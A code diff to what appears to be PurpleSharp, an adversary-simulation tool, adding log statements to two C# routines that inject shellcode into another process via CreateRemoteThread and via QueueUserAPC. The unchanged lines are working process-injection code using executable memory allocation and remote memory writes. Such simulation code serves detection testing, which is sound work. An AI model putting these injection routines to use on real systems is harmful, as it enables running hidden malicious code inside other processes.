@@ -21,12 +21,15 @@ namespace PurpleSharp.Simulations
 
         public static void ProcInjection_CreateRemoteThread(byte[] shellcode, Process proc, Lib.Logger logger)
         {
+            logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
             IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
             Int32 size = shellcode.Length;
+            logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
             IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
             UIntPtr bytesWritten;
             IntPtr size2 = new IntPtr(shellcode.Length);
+            logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
             bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
             logger.TimestampInfo(String.Format("Calling CreateRemoteThread on PID:{0}", proc.Id));
             WinAPI.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
@@ -34,11 +37,14 @@ namespace PurpleSharp.Simulations
 
         public static void ProcInjection_APC(byte[] shellcode, Process proc, Lib.Logger logger)
         {
+            logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
             IntPtr procHandle = WinAPI.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
             Int32 size = shellcode.Length;
+            logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
             IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             UIntPtr bytesWritten;
             IntPtr size2 = new IntPtr(shellcode.Length);
+            logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
             bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
             uint oldProtect = 0;
             bWrite = WinAPI.VirtualProtectEx(procHandle, spaceAddr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
@@ -47,6 +53,7 @@ namespace PurpleSharp.Simulations
             foreach (ProcessThread thread in proc.Threads)
             {
                 IntPtr tHandle = WinAPI.OpenThread(Structs.ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
+                logger.TimestampInfo(String.Format("Calling QueueUserAPC ThreadId:{0}", thread.Id));
                 IntPtr ptr = WinAPI.QueueUserAPC(spaceAddr, tHandle, IntPtr.Zero);
             }
         }
